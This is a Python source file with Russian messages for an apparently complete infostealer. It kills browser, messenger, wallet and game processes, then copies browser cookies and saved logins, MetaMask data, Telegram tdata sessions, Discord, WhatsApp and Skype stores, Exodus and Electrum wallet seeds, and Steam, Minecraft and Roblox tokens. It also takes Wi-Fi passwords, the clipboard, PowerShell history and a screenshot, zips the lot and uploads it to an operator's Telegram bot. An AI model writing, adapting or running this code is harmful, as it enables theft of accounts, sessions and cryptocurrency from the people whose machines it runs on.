import platform
import psutil
import socket
import telebot
import pyautogui
import os
import time
from datetime import datetime
import subprocess
import zipfile
import shutil
from pathlib import Path
import signal
import sys
import traceback
import glob
import re
import io
from PIL import ImageGrab
import winreg

if platform.system() == 'Windows':
    try:
        import ctypes
        ctypes.windll.kernel32.SetProcessDPIAware()
        ctypes.windll.ntdll.RtlSetProcessPlaceholderCompatibilityMode(2)
    except:
        pass

BOT_TOKEN = "токен_бота"
USER_ID = ваш_айди

bot = telebot.TeleBot(BOT_TOKEN)

MAX_PATH_LENGTH = 250

def fix_long_path(path):
    if platform.system() == 'Windows' and len(path) > MAX_PATH_LENGTH:
        if not path.startswith("\\\\?\\"):
            return "\\\\?\\" + os.path.abspath(path)
    return path

def safe_copy_file(src, dst):
    try:
        src = fix_long_path(src)
        dst = fix_long_path(dst)
        
        if os.path.getsize(src) > 100 * 1024 * 1024:
            print(f"Пропуск файла (слишком большой): {src}")
            return False
            
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        
        shutil.copy2(src, dst)
        return True
    except (PermissionError, FileNotFoundError):
        return False
    except Exception as e:
        print(f"Ошибка при копировании {src}: {e}")
        return False

def safe_copy_dir(src, dst):
    try:
        src = fix_long_path(src)
        dst = fix_long_path(dst)
        
        os.makedirs(dst, exist_ok=True)
        
        for item in os.listdir(src):
            src_item = os.path.join(src, item)
            dst_item = os.path.join(dst, item)
            
            if os.path.isdir(src_item):
                safe_copy_dir(src_item, dst_item)
            else:
                safe_copy_file(src_item, dst_item)
                
        return True
    except Exception as e:
        print(f"Ошибка при копировании директории {src}: {e}")
        return False

def get_system_info():
    info = []
    info.append(f"📊 Отчет о системе 📊")
    info.append(f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    info.append(f"💻 Имя компьютера: {socket.gethostname()}")
    info.append(f"🖥️ ОС: {platform.system()} {platform.version()}")
    info.append(f"🔧 Процессор: {platform.processor()}")
    
    cpu_info = f"🔄 CPU использование: {psutil.cpu_percent()}%"
    info.append(cpu_info)
    
    memory = psutil.virtual_memory()
    memory_info = f"🧠 Память: {memory.percent}% использовано"
    memory_info += f" ({round(memory.used/1024/1024/1024, 2)} GB из {round(memory.total/1024/1024/1024, 2)} GB)"
    info.append(memory_info)
    
    disk = psutil.disk_usage('/')
    disk_info = f"💾 Диск: {disk.percent}% использовано"
    disk_info += f" ({round(disk.used/1024/1024/1024, 2)} GB из {round(disk.total/1024/1024/1024, 2)} GB)"
    info.append(disk_info)
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        info.append(f"🌐 Локальный IP: {local_ip}")
    except:
        info.append("🌐 Не удалось получить локальный IP")
    
    try:
        import requests
        external_ip = requests.get('https://api.ipify.org').text
        info.append(f"🌍 Внешний IP: {external_ip}")
    except:
        info.append("🌍 Не удалось получить внешний IP")
        
    return "\n".join(info)

def take_screenshot():
    screenshot_path = "screenshot.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    return screenshot_path

def capture_clipboard():
    clipboard_file = "clipboard.txt"
    clipboard_image = "clipboard.png"

    try:
        img = ImageGrab.grabclipboard()
        if img:
            img.save(clipboard_image)
            return clipboard_image
    except:
        pass
    
    try:
        process = subprocess.Popen(
            ['powershell', '-command', 'Get-Clipboard'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, _ = process.communicate()
        
        if stdout.strip():
            with open(clipboard_file, 'w', encoding='utf-8') as f:
                f.write(stdout)
            return clipboard_file
    except:
        pass
    
    return None

def get_installed_programs():
    programs_file = "installed_programs.txt"
    programs = []
    
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        for i in range(0, winreg.QueryInfoKey(key)[0]):
            try:
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                try:
                    program_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    install_date = winreg.QueryValueEx(subkey, "InstallDate")[0] if "InstallDate" in [winreg.EnumValue(subkey, j)[0] for j in range(winreg.QueryInfoKey(subkey)[1])] else "Unknown"
                    programs.append(f"{program_name} - {install_date}")
                except:
                    pass
            except:
                pass
            
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
        for i in range(0, winreg.QueryInfoKey(key)[0]):
            try:
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                try:
                    program_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    install_date = winreg.QueryValueEx(subkey, "InstallDate")[0] if "InstallDate" in [winreg.EnumValue(subkey, j)[0] for j in range(winreg.QueryInfoKey(subkey)[1])] else "Unknown"
                    programs.append(f"{program_name} - {install_date}")
                except:
                    pass
            except:
                pass
                
        if programs:
            with open(programs_file, 'w', encoding='utf-8') as f:
                f.write("Installed Programs:\n")
                f.write("\n".join(sorted(programs)))
            return programs_file
    except Exception as e:
        print(f"Ошибка при получении списка установленных программ: {e}")
    
    return None

def get_saved_wifi():
    wifi_file = "saved_wifi.txt"
    
    try:
        profiles_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                      capture_output=True, text=True, encoding='cp866')
        profile_names = re.findall(r"Все профили пользователей\s+:\s(.*)", profiles_cmd.stdout)
        
        if not profile_names:
            profile_names = re.findall(r"All User Profile\s+:\s(.*)", profiles_cmd.stdout)
        
        wifi_data = ["Saved Wi-Fi Networks:"]
        
        for name in profile_names:
            name = name.strip()
            try:
                profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], 
                                             capture_output=True, text=True, encoding='cp866')
                
                password = re.search(r"Содержимое ключа\s+:\s(.*)", profile_info.stdout)
                if not password:
                    password = re.search(r"Key Content\s+:\s(.*)", profile_info.stdout)
                
                if password:
                    wifi_data.append(f"SSID: {name} | Password: {password.group(1).strip()}")
                else:
                    wifi_data.append(f"SSID: {name} | Password: Not found")
            except:
                wifi_data.append(f"SSID: {name} | Error retrieving password")
        
        with open(wifi_file, 'w', encoding='utf-8') as f:
            f.write("\n".join(wifi_data))
        
        return wifi_file
    except Exception as e:
        print(f"Ошибка при получении сохраненных Wi-Fi сетей: {e}")
    
    return None

def get_powershell_history():
    ps_history_path = os.path.join(os.getenv('USERPROFILE', ''), 
                                 'AppData', 'Roaming', 'Microsoft', 
                                 'Windows', 'PowerShell', 'PSReadLine', 
                                 'ConsoleHost_history.txt')
    
    if os.path.exists(ps_history_path):
        return ps_history_path
    
    return None

def close_applications():
    print("Закрытие приложений перед сбором данных...")
    
    processes_to_close = [
        "telegram.exe", 
        "Telegram.exe",
        "chrome.exe", 
        "msedge.exe", 
        "brave.exe", 
        "opera.exe",
        "RobloxPlayerBeta.exe",
        "RobloxStudioBeta.exe",
        "firefox.exe",
        "Discord.exe",
        "Skype.exe",
        "WhatsApp.exe",
        "Exodus.exe",
        "Electrum.exe",
        "Steam.exe",
        "SteamService.exe",
        "Epic Games Launcher.exe",
        "EpicGamesLauncher.exe"
    ]
    
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            process_name = proc.info['name']
            if any(p.lower() in process_name.lower() for p in processes_to_close):
                print(f"Закрытие процесса: {process_name} (PID: {proc.info['pid']})")
                try:
                    process = psutil.Process(proc.info['pid'])
                    process.terminate()
                    gone, alive = psutil.wait_procs([process], timeout=3)
                    
                    if process in alive:
                        process.kill()
                except Exception as e:
                    print(f"Ошибка при закрытии процесса {process_name}: {e}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
    time.sleep(2)
    print("Приложения закрыты")

def collect_browser_data(temp_dir):
    print("Сбор данных из браузеров...")
    browser_dir = os.path.join(temp_dir, 'Browser_Data')
    os.makedirs(browser_dir, exist_ok=True)
    
    browser_paths = {
        'Chrome': {
            'cookies': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
            'login_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
            'history': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'History'),
            'bookmarks': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Bookmarks'),
            'web_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data'),
        },
        'Edge': {
            'cookies': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies'),
            'login_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
            'history': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
            'bookmarks': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Bookmarks'),
            'web_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data'),
        },
        'Brave': {
            'cookies': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Network', 'Cookies'),
            'login_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
            'history': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History'),
            'bookmarks': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Bookmarks'),
            'web_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data'),
        },
        'Opera': {
            'cookies': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable', 'Network', 'Cookies'),
            'login_data': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable', 'Login Data'),
            'history': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable', 'History'),
            'bookmarks': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable', 'Bookmarks'),
            'web_data': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable', 'Web Data'),
        },
        'Firefox': {
            'profiles': os.path.join(os.getenv('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles'),
        }
    }
    
    for browser, data_paths in browser_paths.items():
        browser_specific_dir = os.path.join(browser_dir, browser)
        os.makedirs(browser_specific_dir, exist_ok=True)
        
        if browser == 'Firefox':
            profiles_path = data_paths['profiles']
            if os.path.exists(profiles_path):
                try:
                    profiles = glob.glob(os.path.join(profiles_path, '*.default*'))
                    for profile in profiles:
                        profile_name = os.path.basename(profile)
                        profile_dir = os.path.join(browser_specific_dir, profile_name)
                        os.makedirs(profile_dir, exist_ok=True)
                        
                        target_files = ['logins.json', 'key4.db', 'cookies.sqlite', 'places.sqlite', 'formhistory.sqlite']
                        for file in target_files:
                            source_file = os.path.join(profile, file)
                            if os.path.exists(source_file):
                                try:
                                    shutil.copy2(source_file, os.path.join(profile_dir, file))
                                    print(f"  Скопирован файл Firefox: {file}")
                                except Exception as e:
                                    print(f"  Ошибка при копировании файла Firefox {file}: {e}")
                except Exception as e:
                    print(f"Ошибка при обработке профилей Firefox: {e}")
        else:
            for data_type, path in data_paths.items():
                if os.path.exists(path):
                    try:
                        dest_file = os.path.join(browser_specific_dir, data_type)
                        shutil.copy2(path, dest_file)
                        print(f"  Скопирован файл {browser}: {data_type}")
                    except Exception as e:
                        print(f"  Ошибка при копировании файла {browser} {data_type}: {e}")
    
    try:
        chrome_extensions = os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Extensions')
        if os.path.exists(chrome_extensions):
            metamask_id = 'nkbihfbeogaeaoehlefnkodbefgpgknn'
            metamask_path = os.path.join(chrome_extensions, metamask_id)
            
            if os.path.exists(metamask_path):
                metamask_dir = os.path.join(browser_dir, 'Metamask')
                os.makedirs(metamask_dir, exist_ok=True)
                
                versions = os.listdir(metamask_path)
                if versions:
                    latest_version = sorted(versions)[-1]
                    metamask_data = os.path.join(metamask_path, latest_version, 'Local Extension Settings', metamask_id)
                    
                    if os.path.exists(metamask_data):
                        try:
                            shutil.copytree(metamask_data, os.path.join(metamask_dir, 'Data'))
                            print("  Скопированы данные Metamask")
                        except Exception as e:
                            print(f"  Ошибка при копировании данных Metamask: {e}")
    except Exception as e:
        print(f"Ошибка при обработке расширений браузера: {e}")
    
    return browser_dir

def collect_messenger_data(temp_dir):
    print("Сбор данных из мессенджеров...")
    messenger_dir = os.path.join(temp_dir, 'Messenger_Data')
    os.makedirs(messenger_dir, exist_ok=True)
    
    discord_path = os.path.join(os.getenv('APPDATA', ''), 'discord', 'Local Storage', 'leveldb')
    if os.path.exists(discord_path):
        discord_dir = os.path.join(messenger_dir, 'Discord')
        try:
            shutil.copytree(discord_path, os.path.join(discord_dir, 'leveldb'))
            print("  Скопированы данные Discord")
        except Exception as e:
            print(f"  Ошибка при копировании данных Discord: {e}")
    
    skype_path = os.path.join(os.getenv('APPDATA', ''), 'Skype')
    if os.path.exists(skype_path):
        try:
            user_folders = [f for f in os.listdir(skype_path) if not f.startswith('.') and os.path.isdir(os.path.join(skype_path, f))]
            
            if user_folders:
                skype_dir = os.path.join(messenger_dir, 'Skype')
                os.makedirs(skype_dir, exist_ok=True)
                
                for user in user_folders:
                    user_path = os.path.join(skype_path, user)
                    if os.path.isdir(user_path) and len(user) > 3:
                        try:
                            shutil.copytree(user_path, os.path.join(skype_dir, user))
                            print(f"  Скопированы данные Skype пользователя: {user}")
                        except Exception as e:
                            print(f"  Ошибка при копировании данных Skype пользователя {user}: {e}")
        except Exception as e:
            print(f"  Ошибка при обработке данных Skype: {e}")
    
    whatsapp_path = os.path.join(os.getenv('LOCALAPPDATA', ''), 'WhatsApp')
    if os.path.exists(whatsapp_path):
        whatsapp_dir = os.path.join(messenger_dir, 'WhatsApp')
        os.makedirs(whatsapp_dir, exist_ok=True)
        
        important_dirs = ['Databases', 'Local Storage']
        for dir_name in important_dirs:
            dir_path = os.path.join(whatsapp_path, dir_name)
            if os.path.exists(dir_path):
                try:
                    shutil.copytree(dir_path, os.path.join(whatsapp_dir, dir_name))
                    print(f"  Скопированы данные WhatsApp: {dir_name}")
                except Exception as e:
                    print(f"  Ошибка при копировании данных WhatsApp {dir_name}: {e}")
    
    return messenger_dir

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    
    return roblox_cookies_path if os.path.exists(roblox_cookies_path) else None

def collect_crypto_wallets(temp_dir):
    print("Сбор данных криптокошельков...")
    crypto_dir = os.path.join(temp_dir, 'Crypto_Wallets')
    os.makedirs(crypto_dir, exist_ok=True)
    
    exodus_path = os.path.join(os.getenv('APPDATA', ''), 'Exodus')
    if os.path.exists(exodus_path):
        exodus_dir = os.path.join(crypto_dir, 'Exodus')
        try:
            os.makedirs(exodus_dir, exist_ok=True)
            
            key_paths = ['exodus.wallet.aes.json', 'window-state.json', 'seed.seco', 'passphrase.seco']
            
            for item in os.listdir(exodus_path):
                item_path = os.path.join(exodus_path, item)
                
                if os.path.isfile(item_path) and item in key_paths:
                    dst_path = os.path.join(exodus_dir, item)
                    if safe_copy_file(item_path, dst_path):
                        print(f"  Скопирован файл Exodus: {item}")
                
                elif item == 'localStorage':
                    storage_path = os.path.join(exodus_path, 'localStorage')
                    if os.path.exists(storage_path):
                        dst_path = os.path.join(exodus_dir, 'localStorage')
                        if safe_copy_dir(storage_path, dst_path):
                            print("  Скопировано локальное хранилище Exodus")
        except Exception as e:
            print(f"Ошибка при сборе данных Exodus: {e}")
    
    electrum_wallets_path = os.path.join(os.getenv('APPDATA', ''), 'Electrum', 'wallets')
    if os.path.exists(electrum_wallets_path):
        electrum_dir = os.path.join(crypto_dir, 'Electrum')
        os.makedirs(electrum_dir, exist_ok=True)
        wallets_dir = os.path.join(electrum_dir, 'wallets')
        if safe_copy_dir(electrum_wallets_path, wallets_dir):
            print("  Скопированы кошельки Electrum")
    
    wallet_extensions = ['.wallet', '.dat', '.json', '.key']
    wallet_keywords = ['wallet', 'crypto', 'bitcoin', 'ethereum', 'ripple', 'litecoin', 
                       'private', 'seed', 'key', 'keys', 'backup', 'btc', 'eth']
    
    max_depth = 3
    max_files = 50
    files_found = 0
    
    search_paths = [
        os.path.join(os.getenv('USERPROFILE', ''), 'Documents'),
        os.path.join(os.getenv('USERPROFILE', ''), 'Desktop'),
        os.path.join(os.getenv('USERPROFILE', ''), 'Downloads')
    ]
    
    misc_wallets_dir = os.path.join(crypto_dir, 'Misc_Wallets')
    os.makedirs(misc_wallets_dir, exist_ok=True)
    
    for search_path in search_paths:
        if not os.path.exists(search_path):
            continue
            
        for root, dirs, files in os.walk(search_path):
            relative_path = os.path.relpath(root, search_path)
            depth = len(relative_path.split(os.sep))
            if depth > max_depth:
                dirs[:] = []
                continue
                
            for file in files:
                if files_found >= max_files:
                    break
                    
                file_lower = file.lower()
                if any(file_lower.endswith(ext) for ext in wallet_extensions) or any(keyword in file_lower for keyword in wallet_keywords):
                    try:
                        file_path = os.path.join(root, file)
                        
                        if os.path.getsize(file_path) > 10 * 1024 * 1024:
                            continue
                            
                        simple_path = f"{os.path.basename(search_path)}_{depth}_{file}"
                        dest_path = os.path.join(misc_wallets_dir, simple_path)
                        
                        if safe_copy_file(file_path, dest_path):
                            print(f"  Найден и скопирован возможный файл кошелька: {simple_path}")
                            files_found += 1
                    except Exception:
                        continue
            
            if files_found >= max_files:
                break
    
    return crypto_dir

def collect_game_data(temp_dir):
    print("Сбор игровых данных...")
    games_dir = os.path.join(temp_dir, 'Game_Data')
    os.makedirs(games_dir, exist_ok=True)
    
    steam_path = os.path.join(os.getenv('ProgramFiles(x86)', ''), 'Steam')
    if os.path.exists(steam_path):
        steam_dir = os.path.join(games_dir, 'Steam')
        os.makedirs(steam_dir, exist_ok=True)
        
        config_path = os.path.join(steam_path, 'config')
        if os.path.exists(config_path):
            try:
                shutil.copytree(config_path, os.path.join(steam_dir, 'config'))
                print("  Скопирована конфигурация Steam")
            except Exception as e:
                print(f"  Ошибка при копировании конфигурации Steam: {e}")
        
        for file in os.listdir(steam_path):
            if file.startswith('ssfn'):
                try:
                    shutil.copy2(os.path.join(steam_path, file), os.path.join(steam_dir, file))
                    print(f"  Скопирован токен Steam: {file}")
                except Exception as e:
                    print(f"  Ошибка при копировании токена Steam {file}: {e}")
    
    minecraft_path = os.path.join(os.getenv('APPDATA', ''), '.minecraft')
    if os.path.exists(minecraft_path):
        minecraft_dir = os.path.join(games_dir, 'Minecraft')
        os.makedirs(minecraft_dir, exist_ok=True)
        
        launcher_profiles = os.path.join(minecraft_path, 'launcher_profiles.json')
        if os.path.exists(launcher_profiles):
            try:
                shutil.copy2(launcher_profiles, os.path.join(minecraft_dir, 'launcher_profiles.json'))
                print("  Скопированы профили запуска Minecraft")
            except Exception as e:
                print(f"  Ошибка при копировании профилей Minecraft: {e}")
        
        auth_files = ['launcher_accounts.json', 'launcher_msa_credentials.bin', 'launcher_settings.json']
        for file in auth_files:
            file_path = os.path.join(minecraft_path, file)
            if os.path.exists(file_path):
                try:
                    shutil.copy2(file_path, os.path.join(minecraft_dir, file))
                    print(f"  Скопирован файл аутентификации Minecraft: {file}")
                except Exception as e:
                    print(f"  Ошибка при копировании файла Minecraft {file}: {e}")
    
    epic_path = os.path.join(os.getenv('LOCALAPPDATA', ''), 'EpicGamesLauncher')
    if os.path.exists(epic_path):
        epic_dir = os.path.join(games_dir, 'Epic_Games')
        os.makedirs(epic_dir, exist_ok=True)
        
        saved_path = os.path.join(epic_path, 'Saved')
        if os.path.exists(saved_path):
            try:
                for folder in ['Config', 'Data']:
                    folder_path = os.path.join(saved_path, folder)
                    if os.path.exists(folder_path):
                        shutil.copytree(folder_path, os.path.join(epic_dir, folder))
                        print(f"  Скопированы данные Epic Games: {folder}")
            except Exception as e:
                print(f"  Ошибка при копировании данных Epic Games: {e}")
    
    return games_dir

def find_sensitive_files(temp_dir):
    print("Поиск конфиденциальных файлов...")
    sensitive_dir = os.path.join(temp_dir, 'Sensitive_Files')
    os.makedirs(sensitive_dir, exist_ok=True)
    
    sensitive_keywords = [
        'password', 'пароль', 'login', 'логин', 'secret', 'секрет', 'private', 
        'crypto', 'wallet', 'кошелек', 'account', 'аккаунт', 'token', 'токен', 
        'key', 'ключ', 'seed', 'сид', 'mnemonic', 'мнемоник', 'credentials',
        'credit card', 'банковская карта', 'банк', 'card', 'карта'
    ]
    
    doc_extensions = [
        '.txt', '.doc', '.docx', '.pdf', '.xlsx', '.xls', '.rtf', '.odt', 
        '.csv', '.json', '.xml', '.ini', '.conf', '.cfg'
    ]
    
    search_paths = [
        os.path.join(os.getenv('USERPROFILE', ''), 'Documents'),
        os.path.join(os.getenv('USERPROFILE', ''), 'Desktop'),
        os.path.join(os.getenv('USERPROFILE', ''), 'Downloads')
    ]
    
    max_size = 5 * 1024 * 1024
    
    max_depth = 3
    max_files = 30
    
    files_found = 0
    
    for search_path in search_paths:
        if not os.path.exists(search_path):
            continue
            
        try:
            for root, dirs, files in os.walk(search_path):
                relative_path = os.path.relpath(root, search_path)
                depth = len(relative_path.split(os.sep))
                if depth > max_depth:
                    dirs[:] = []
                    continue
                
                for file in files:
                    if files_found >= max_files:
                        break
                        
                    if any(file.lower().endswith(ext) for ext in doc_extensions):
                        try:
                            file_path = os.path.join(root, file)
                            
                            if not os.path.exists(file_path) or os.path.getsize(file_path) > max_size:
                                continue
                                
                            file_lower = file.lower()
                            
                            if any(keyword in file_lower for keyword in sensitive_keywords):
                                simple_path = f"{os.path.basename(search_path)}_{depth}_{file}"
                                dest_path = os.path.join(sensitive_dir, simple_path)
                                
                                if safe_copy_file(file_path, dest_path):
                                    print(f"  Найден и скопирован конфиденциальный файл: {simple_path}")
                                    files_found += 1
                        except Exception:
                            continue
                
                if files_found >= max_files:
                    break
        except Exception as e:
            print(f"Ошибка при поиске конфиденциальных файлов в {search_path}: {e}")
    
    if files_found == 0:
        print("  Конфиденциальные файлы не найдены")
    
    return sensitive_dir

def collect_telegram_files(temp_dir):
    telegram_paths = [
        os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Telegram Desktop'),
        r"W:\Users\User\AppData\Roaming\Telegram Desktop"
    ]
    
    tg_files_collected = False
    
    for tg_path in telegram_paths:
        if os.path.exists(tg_path):
            try:
                print(f"Найден Telegram Desktop: {tg_path}")
                
                tg_dir = os.path.join(temp_dir, 'Telegram_Files')
                os.makedirs(tg_dir, exist_ok=True)
                
                tdata_path = os.path.join(tg_path, 'tdata')
                
                if os.path.exists(tdata_path):
                    tdata_dir = os.path.join(tg_dir, 'tdata')
                    os.makedirs(tdata_dir, exist_ok=True)
                    
                    critical_files = ['_key_data', 'settings', 'shortcuts-custom.json', 'usertag', 'config.json']
                    
                    session_folders = ['D', 'D877', 'D0']
                    
                    for item in os.listdir(tdata_path):
                        item_path = os.path.join(tdata_path, item)
                        dest_path = os.path.join(tdata_dir, item)
                        
                        try:
                            if os.path.isfile(item_path) and (item in critical_files or item.startswith('map')):
                                shutil.copy2(item_path, dest_path)
                                print(f"  Скопирован файл: {item}")
                            elif os.path.isdir(item_path) and (item in session_folders or item.startswith('D')):
                                shutil.copytree(item_path, dest_path)
                                print(f"  Скопирована папка: {item}")
                        except Exception as e:
                            print(f"  Ошибка при копировании {item}: {e}")
                    
                    tg_files_collected = True
                    print("Завершено копирование файлов Telegram")
                else:
                    print(f"Папка tdata не найдена по пути: {tdata_path}")
                    
                    for item in os.listdir(tg_path):
                        item_path = os.path.join(tg_path, item)
                        dest_path = os.path.join(tg_dir, item)
                        
                        try:
                            if os.path.isfile(item_path):
                                shutil.copy2(item_path, dest_path)
                                print(f"  Скопирован файл: {item}")
                            elif os.path.isdir(item_path) and item != 'tupdates' and item != 'tdumps':
                                shutil.copytree(item_path, dest_path)
                                print(f"  Скопирована папка: {item}")
                        except Exception as e:
                            print(f"  Ошибка при копировании {item}: {e}")
                    
                    tg_files_collected = True
                
            except Exception as e:
                print(f"Ошибка при сборе данных Telegram: {e}")
                traceback.print_exc()
        
        if tg_files_collected:
            break
    
    return tg_files_collected

def collect_and_zip_files():
    zip_filename = "collected_data.zip"
    
    temp_base = os.environ.get('TEMP', os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Local', 'Temp'))
    temp_dir = os.path.join(temp_base, "pc_info_data_" + datetime.now().strftime("%Y%m%d%H%M%S"))
    
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)
    
    print(f"Начинаю сбор файлов в {temp_dir}...")
    
    system_dir = os.path.join(temp_dir, 'System_Info')
    os.makedirs(system_dir, exist_ok=True)
    
    try:
        programs_file = get_installed_programs()
        if programs_file and os.path.exists(programs_file):
            shutil.copy2(programs_file, os.path.join(system_dir, 'installed_programs.txt'))
            os.remove(programs_file)
            print("Скопирован список установленных программ")
        
        wifi_file = get_saved_wifi()
        if wifi_file and os.path.exists(wifi_file):
            shutil.copy2(wifi_file, os.path.join(system_dir, 'saved_wifi.txt'))
            os.remove(wifi_file)
            print("Скопирован список сохраненных Wi-Fi сетей")
        
        ps_history = get_powershell_history()
        if ps_history and os.path.exists(ps_history):
            shutil.copy2(ps_history, os.path.join(system_dir, 'powershell_history.txt'))
            print("Скопирована история PowerShell")
        
        clipboard_file = capture_clipboard()
        if clipboard_file and os.path.exists(clipboard_file):
            ext = os.path.splitext(clipboard_file)[1]
            shutil.copy2(clipboard_file, os.path.join(system_dir, f'clipboard{ext}'))
            os.remove(clipboard_file)
            print("Скопировано содержимое буфера обмена")
    except Exception as e:
        print(f"Ошибка при сборе системных данных: {e}")
    
    telegram_collected = collect_telegram_files(temp_dir)
    if not telegram_collected:
        print("Не удалось собрать файлы Telegram Desktop")
    
    try:
        collect_browser_data(temp_dir)
    except Exception as e:
        print(f"Ошибка при сборе данных браузеров: {e}")
    
    try:
        collect_messenger_data(temp_dir)
    except Exception as e:
        print(f"Ошибка при сборе данных мессенджеров: {e}")
    
    try:
        collect_crypto_wallets(temp_dir)
    except Exception as e:
        print(f"Ошибка при сборе данных криптокошельков: {e}")
    
    try:
        collect_game_data(temp_dir)
    except Exception as e:
        print(f"Ошибка при сборе игровых данных: {e}")
    
    try:
        find_sensitive_files(temp_dir)
    except Exception as e:
        print(f"Ошибка при поиске конфиденциальных файлов: {e}")
    
    roblox_cookies = retrieve_roblox_cookies()
    if roblox_cookies:
        roblox_dir = os.path.join(temp_dir, 'Roblox_Data')
        os.makedirs(roblox_dir, exist_ok=True)
        try:
            shutil.copy2(roblox_cookies, os.path.join(roblox_dir, 'robloxcookies.dat'))
            print("Скопированы Roblox cookies")
        except Exception as e:
            print(f"Ошибка при копировании Roblox cookies: {e}")
    
    print("Создаю ZIP-архив...")
    try:
        zip_path = os.path.join(temp_base, zip_filename)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        rel_path = os.path.relpath(file_path, temp_dir)
                        if len(rel_path) > MAX_PATH_LENGTH:
                            continue
                        zipf.write(file_path, rel_path)
                    except Exception as e:
                        print(f"Пропуск файла в архиве: {file_path}")
        
        shutil.copy2(zip_path, zip_filename)
        os.remove(zip_path)
    except Exception as e:
        print(f"Ошибка при создании ZIP-архива: {e}")
        try:
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(temp_dir):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            rel_path = os.path.relpath(file_path, temp_dir)
                            zipf.write(file_path, rel_path)
                        except:
                            pass
        except:
            print("Критическая ошибка при создании архива!")
    
    try:
        shutil.rmtree(temp_dir)
    except:
        print("Не удалось удалить временный каталог")
    
    return zip_filename

def send_info_to_telegram():
    try:
        system_info = get_system_info()
        
        screenshot_path = take_screenshot()
        
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(USER_ID, photo, caption=system_info)
        
        os.remove(screenshot_path)
        
        bot.send_message(USER_ID, "🔍 Начинаю сбор расширенных данных, это может занять некоторое время...")
        
        close_applications()
        
        print("Сбор и упаковка файлов...")
        zip_file = collect_and_zip_files()
        
        if os.path.exists(zip_file) and os.path.getsize(zip_file) > 0:
            zip_size_mb = os.path.getsize(zip_file) / (1024 * 1024)
            print(f"Размер архива: {zip_size_mb:.2f} MB")
            
            print(f"Отправка ZIP-архива {zip_file}...")
            
            if zip_size_mb > 50:
                bot.send_message(USER_ID, f"⚠️ Предупреждение: размер собранных данных большой ({zip_size_mb:.2f} MB). Отправка может занять время.")
            
            with open(zip_file, 'rb') as doc:
                bot.send_document(USER_ID, doc, caption=f"📦 Собранные данные с устройства. Размер: {zip_size_mb:.2f} MB")
            
            os.remove(zip_file)
            
            bot.send_message(USER_ID, "✅ Сбор и отправка данных успешно завершены!")
        else:
            print("Архив пустой или не создан!")
            bot.send_message(USER_ID, "❌ Ошибка при создании архива с данными!")
        
        return True
    except Exception as e:
        error_msg = f"Ошибка при отправке данных: {e}"
        print(error_msg)
